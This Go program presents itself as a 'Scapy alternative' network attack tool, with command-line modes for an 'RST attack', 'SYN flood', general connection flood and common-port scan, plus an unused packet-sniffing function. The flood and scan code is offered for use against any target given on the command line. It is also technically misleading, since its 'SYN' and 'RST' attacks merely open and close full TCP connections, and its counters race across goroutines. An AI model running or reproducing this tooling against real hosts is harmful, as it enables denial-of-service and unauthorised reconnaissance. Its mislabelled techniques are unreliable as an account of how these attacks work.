package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	
	"strconv"
	"time"
	
	"github.com/google/gopacket"
	
	"github.com/google/gopacket/pcap"
)

func main() {
	fmt.Println("🚀 Advanced Network Tool - Scapy Alternative")
	fmt.Println("=============================================")

	// Command line flags
	mode := flag.String("mode", "rst", "Mode: rst, syn, flood, scan")
	target := flag.String("target", "localhost", "Target IP/hostname")
	port := flag.Int("port", 3000, "Target port")
	count := flag.Int("count", 100, "Number of packets")
	delay := flag.Int("delay", 0, "Delay between packets (ms)")
	flag.Parse()

	switch *mode {
	case "rst":
		sendRSTPackets(*target, *port, *count, *delay)
	case "syn":
		sendSYNFlood(*target, *port, *count)
	case "flood":
		floodAttack(*target, *port, *count)
	case "scan":
		portScan(*target)
	default:
		fmt.Println("Invalid mode. Use: rst, syn, flood, scan")
	}
}

// Send RST packets (Scapy equivalent)
func sendRSTPackets(target string, port, count, delay int) {
	fmt.Printf("🎯 Sending %d RST packets to %s:%d\n", count, target, port)

	// Resolve target
	targetIP, err := resolveTarget(target)
	if err != nil {
		log.Printf("Error resolving target: %v", err)
		return
	}

	successCount := 0
	for i := 0; i < count; i++ {
		// Create TCP connection and immediately close with RST
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(targetIP, strconv.Itoa(port)), 2*time.Second)
		if err != nil {
			log.Printf("Packet %d: Connection failed - %v", i+1, err)
		} else {
			// Set linger to 0 for RST-like behavior
			if tcpConn, ok := conn.(*net.TCPConn); ok {
				tcpConn.SetLinger(0)
			}
			conn.Close()
			successCount++
			
			if (i+1)%100 == 0 {
				fmt.Printf("✅ Sent %d packets...\n", i+1)
			}
		}

		if delay > 0 {
			time.Sleep(time.Duration(delay) * time.Millisecond)
		}
	}

	fmt.Printf("📊 RST attack completed: %d/%d packets sent\n", successCount, count)
}

// SYN Flood attack
func sendSYNFlood(target string, port, count int) {
	fmt.Printf("🌊 Starting SYN Flood on %s:%d with %d packets\n", target, port, count)

	targetIP, err := resolveTarget(target)
	if err != nil {
		log.Printf("Error resolving target: %v", err)
		return
	}

	successCount := 0
	for i := 0; i < count; i++ {
		go func(packetNum int) {
			conn, err := net.DialTimeout("tcp", net.JoinHostPort(targetIP, strconv.Itoa(port)), 1*time.Second)
			if err == nil {
				if tcpConn, ok := conn.(*net.TCPConn); ok {
					tcpConn.SetLinger(0)
				}
				conn.Close()
				successCount++
				
				if (packetNum+1)%100 == 0 {
					fmt.Printf("SYN packet %d sent\n", packetNum+1)
				}
			}
		}(i)

		time.Sleep(5 * time.Millisecond)
	}

	time.Sleep(3 * time.Second)
	fmt.Printf("📊 SYN Flood completed: %d/%d packets sent\n", successCount, count)
}

// General flood attack
func floodAttack(target string, port, count int) {
	fmt.Printf("🚨 Starting flood attack on %s:%d with %d packets\n", target, port, count)

	targetIP, err := resolveTarget(target)
	if err != nil {
		log.Printf("Error resolving target: %v", err)
		return
	}

	successCount := 0
	for i := 0; i < count; i++ {
		go func(packetNum int) {
			conn, err := net.Dial("tcp", net.JoinHostPort(targetIP, strconv.Itoa(port)))
			if err == nil {
				conn.Close()
				successCount++
				
				if (packetNum+1)%100 == 0 {
					fmt.Printf("Flood packet %d sent\n", packetNum+1)
				}
			}
		}(i)

		time.Sleep(10 * time.Millisecond)
	}

	time.Sleep(5 * time.Second)
	fmt.Printf("📊 Flood attack completed: %d/%d packets sent\n", successCount, count)
}

// Port scanning
func portScan(target string) {
	fmt.Printf("🔍 Scanning common ports on %s\n", target)

	commonPorts := []int{21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3000, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017}

	openPorts := []int{}
	
	for _, port := range commonPorts {
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(target, strconv.Itoa(port)), 2*time.Second)
		if err == nil {
			fmt.Printf("✅ Port %d: OPEN\n", port)
			openPorts = append(openPorts, port)
			conn.Close()
		} else {
			fmt.Printf("❌ Port %d: CLOSED\n", port)
		}
	}
	
	fmt.Printf("\n📊 Open ports: %v\n", openPorts)
}

// Resolve target to IP
func resolveTarget(target string) (string, error) {
	// If it's already an IP, return as is
	if net.ParseIP(target) != nil {
		return target, nil
	}
	
	// Resolve hostname
	ips, err := net.LookupIP(target)
	if err != nil {
		return "", err
	}
	
	// Prefer IPv4
	for _, ip := range ips {
		if ipv4 := ip.To4(); ipv4 != nil {
			return ipv4.String(), nil
		}
	}
	
	if len(ips) > 0 {
		return ips[0].String(), nil
	}
	
	return "", fmt.Errorf("could not resolve target: %s", target)
}

// Packet sniffing (optional)
func sniffPackets(interfaceName string) {
	fmt.Printf("👃 Sniffing packets on interface: %s\n", interfaceName)

	if interfaceName == "" {
		devices, err := pcap.FindAllDevs()
		if err != nil {
			log.Fatal(err)
		}

		fmt.Println("Available interfaces:")
		for _, device := range devices {
			fmt.Printf(" - %s\n", device.Name)
		}
		return
	}

	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	fmt.Println("Starting packet capture... (Ctrl+C to stop)")

	for packet := range packetSource.Packets() {
		fmt.Printf("Packet: %s\n", packet.String())
	}
}